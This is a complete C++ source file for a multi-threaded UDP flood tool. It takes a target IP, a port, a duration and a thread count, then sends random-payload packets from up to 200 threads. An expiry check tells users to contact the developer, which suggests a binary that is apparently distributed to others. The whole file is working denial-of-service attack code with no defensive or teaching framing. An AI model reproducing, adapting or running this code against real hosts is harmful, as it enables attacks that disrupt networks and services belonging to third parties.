#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <vector>
#include <thread>
#include <mutex>

class UDPAttack {
public:
    // Constants for packet and payload sizes
    static constexpr size_t PACKET_SIZE = 65507;  // Maximum UDP packet size
    static constexpr size_t PAYLOAD_SIZE = 1400;   // Commonly used UDP payload size

    // Expiry date constants (set your desired date)
    static const int EXPIRY_DAY = 20;
    static const int EXPIRY_MONTH = 12;  // December
    static const int EXPIRY_YEAR = 2024;

    // Default number of threads
    static const int DEFAULT_THREAD_COUNT = 200;

    // Mutex for synchronized logging
    std::mutex log_mutex;

    // Function to check if the binary has expired
    bool is_binary_expired() {
        time_t now = time(nullptr);
        struct tm *current_time = localtime(&now);

        return (current_time->tm_year + 1900 > EXPIRY_YEAR) ||
               (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
               (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
                current_time->tm_mday > EXPIRY_DAY);
    }

    // Function to generate a random payload for UDP packets
    void generate_payload(char *buffer, size_t size) {
        static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        for (size_t i = 0; i < size; ++i) {
            buffer[i] = charset[rand() % (sizeof(charset) - 1)];
        }
    }

    // Function to perform a UDP flood from a single thread
    void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
        sockaddr_in server_addr{};
        char buffer[PAYLOAD_SIZE];

        // Create a UDP socket
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << strerror(errno) << std::endl;
            return;
        }

        // Configure server address
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
            close(sock);
            return;
        }

        // Fill the buffer with random data
        generate_payload(buffer, PAYLOAD_SIZE);

        // Flood loop
        time_t start_time = time(nullptr);
        while (time(nullptr) - start_time < attack_time) {
            ssize_t sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
            if (sent < 0) {
                std::lock_guard<std::mutex> lock(log_mutex);
                std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << strerror(errno) << std::endl;
            }
        }

        close(sock);
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
    }

    // Function to run the UDP attack in multiple threads
    void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
        std::vector<std::thread> threads;

        std::cout << "Launching multi-threaded UDP flood attack with " << thread_count << " threads..." << std::endl;

        // Create and start threads
        for (int i = 0; i < thread_count; ++i) {
            threads.emplace_back(&UDPAttack::udp_attack_thread, this, ip, port, attack_time, i + 1);
        }

        // Wait for all threads to finish
        for (auto &thread : threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }

        std::cout << "Multi-threaded attack completed." << std::endl;
    }
};

// Function to get the number of threads from the command line arguments or use a default value
int get_thread_count(int argc, char *argv[]) {
    if (argc == 5) {
        return std::stoi(argv[4]);  // Get thread count from argument if provided
    }
    return UDPAttack::DEFAULT_THREAD_COUNT;  // Use default thread count if not provided
}

int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int thread_count = get_thread_count(argc, argv);  // Determine thread count

    UDPAttack attack;

    // Check if the binary has expired
    if (attack.is_binary_expired()) {
        std::cerr << "Error: This binary has expired. Please contact the developer." << std::endl;
        return EXIT_FAILURE;
    }

    // Perform the multi-threaded attack
    attack.multi_threaded_udp_attack(ip, port, duration, thread_count);

    return EXIT_SUCCESS;
}